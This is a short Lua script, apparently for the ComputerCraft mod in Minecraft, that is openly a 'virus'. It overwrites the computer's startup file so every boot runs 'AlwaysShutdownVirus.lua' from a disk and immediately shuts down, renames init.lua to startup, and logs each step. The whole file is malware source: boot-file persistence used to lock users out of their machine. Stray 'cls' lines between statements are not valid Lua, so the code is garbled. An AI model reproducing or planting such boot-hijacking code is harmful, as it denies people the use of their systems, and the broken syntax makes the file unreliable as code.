-- Debugging function
local function log(message)
    local logFile = fs.open("debug.log", "a")
    logFile.writeLine(message)
    logFile.close()
end
cls
-- Log the start of the script
log("Script started")
cls
-- Open the startup script for writing
local startup = fs.open("startup", "w")
cls
-- Write the commands to the startup script
startup.writeLine('shell.run("cd /disk")')
startup.writeLine('shell.run("AlwaysShutdownVirus.lua")')
startup.writeLine('sleep(1)')
startup.writeLine('os.shutdown()')
startup.close()
cls
-- Log the writing of the startup script
log("Startup script written")
cls
-- Rename itself to startup if necessary
if fs.exists("init.lua") then
    fs.move("init.lua", "startup")
    log("Renamed init.lua to startup")
end
cls
-- Execute the virus script immediately
log("Executing AlwaysShutdownVirus.lua")
shell.run("cd /disk")
shell.run("AlwaysShutdownVirus.lua")
log("Executed AlwaysShutdownVirus.lua")
cls
-- Wait and shutdown
sleep(1)
log("Shutting down")
os.shutdown()

 
